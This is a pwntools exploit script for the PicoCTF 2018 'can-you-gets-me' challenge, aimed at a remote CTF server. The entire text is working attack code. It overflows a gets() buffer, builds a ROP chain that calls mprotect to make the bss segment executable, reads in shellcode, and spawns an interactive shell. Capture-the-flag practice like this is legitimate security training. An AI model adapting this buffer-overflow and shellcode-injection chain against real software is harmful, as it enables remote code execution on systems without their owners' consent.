from pwn import *

#p = process('./PicoCTF_2018_can-you-gets-me')
p = remote('node4.buuoj.cn', 27304)
elf = ELF('./PicoCTF_2018_can-you-gets-me')

bss = 0x080EB000
pop_3_ret = 0x0809D343

mprotect = elf.sym['mprotect']
gets = elf.sym['gets']

shellcode = asm(shellcraft.sh(), arch='i386', os='linux')

payload = b'a' * ( 0x18 + 4 ) + p32(mprotect) + p32(pop_3_ret) + p32(bss) + p32(0x1000) + p32(7)
payload += p32(gets) + p32(bss) + p32(bss)

p.sendlineafter(b'GIVE ME YOUR NAME!\n', payload)
p.sendline(shellcode)

p.interactive()